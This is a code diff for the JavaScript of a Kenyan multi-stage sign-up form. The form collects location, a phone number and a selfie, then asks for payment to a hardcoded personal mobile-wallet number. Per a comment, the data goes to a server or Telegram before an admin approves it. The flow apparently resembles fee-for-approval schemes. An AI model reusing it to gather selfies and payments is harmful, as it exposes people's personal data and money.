@@ -17,7 +17,7 @@ document.addEventListener('DOMContentLoaded', () => {
         'mombasa', 'nyali', 'likoni', 'changamwe', 'kisauni', 'mvita',
         'kisumu', 'nakuru', 'eldoret', 'thika', 'ruiru', 'kiambu', 'machakos', 'kitengela', 'ngong', 'ongata rongai',
         'naivasha', 'nyeri', 'meru', 'embu', 'kericho', 'kakamega', 'bungoma', 'kitale', 'malindi', 'diani', 'kilifi',
-        'machakos', 'makueni', 'kajiado', 'narok', 'bomet', 'kisii', 'homabay', 'migori', 'siaya', 'busia', 'vihiga',
+        'makueni', 'kajiado', 'narok', 'bomet', 'kisii', 'homabay', 'migori', 'siaya', 'busia', 'vihiga',
         'nanyuki', 'karatina', 'limuru', 'juja', 'kikuyu', 'athiriver', 'voi', 'garissa', 'isiolo', 'lamu'
     ];
 
@@ -49,7 +49,7 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Stage 2: Details Validation
+    // Stage 2: Details & Location Validation
     const phoneError = document.getElementById('phone-match-error');
     let locError = document.getElementById('location-error');
     if (!locError) {
@@ -102,7 +102,7 @@ document.addEventListener('DOMContentLoaded', () => {
         document.getElementById(id).addEventListener('input', checkStage2Validity);
     });
 
-    // Stage 3: Selfie File Upload & Validation
+    // Stage 3: Selfie Verification Upload
     const selfieInput = document.getElementById('selfiePhoto');
     const selfiePreview = document.getElementById('selfie-preview');
     const selfiePreviewBox = document.getElementById('selfie-preview-container');
@@ -118,7 +118,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 selfiePreviewBox.style.display = 'block';
                 selfieError.style.display = 'none';
                 
-                // Automatically proceed to Payment stage after selfie upload preview
                 setTimeout(() => goToStage(4), 500);
             };
             reader.readAsDataURL(file);
@@ -127,7 +126,19 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
 
-    // Stage 4: Submit Payment & Start Timer
+    // Stage 4: Copy Pochi Number Button
+    document.getElementById('copy-pochi-btn').addEventListener('click', () => {
+        const pochiNum = document.getElementById('pochi-number').innerText.trim();
+        navigator.clipboard.writeText(pochiNum).then(() => {
+            const statusMsg = document.getElementById('copy-status-msg');
+            statusMsg.textContent = '✓ Number copied to clipboard!';
+            setTimeout(() => { statusMsg.textContent = ''; }, 3500);
+        }).catch(() => {
+            alert('Failed to copy. Please manually note 0757648339.');
+        });
+    });
+
+    // Stage 4 Submit: Trigger 10s Timer & Send to Server / Telegram
     document.getElementById('i-have-paid-btn').addEventListener('click', () => {
         const wallet = document.getElementById('walletNumber').value.trim();
         if (!/^(07|01)[0-9]{8}$/.test(wallet)) {
@@ -135,7 +146,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         if (!formData.selfieDataUrl) {
-            alert('Please upload a selfie photo before submitting.');
+            alert('Please upload a selfie photo before proceeding.');
             goToStage(3);
             return;
         }
@@ -178,7 +189,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 1000);
     });
 
-    // Stage 5: Poll for Approval
+    // Stage 5: Poll status from admin responses
     function startPollingForAdminApproval() {
         if (pollInterval) clearInterval(pollInterval);
         pollInterval = setInterval(async () => {
@@ -201,7 +212,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     goToStage(6);
                 } else if (data.status === 'REJECTED') {
                     clearInterval(pollInterval);
-                    alert('❌ Payment was not detected or was rejected. Please try again.');
+                    alert('❌ Payment was not detected or was rejected by admin. Please try again.');
                     document.getElementById('countdown-card').style.display = 'block';
                     document.getElementById('verification-card').style.display = 'none';
                     goToStage(4);
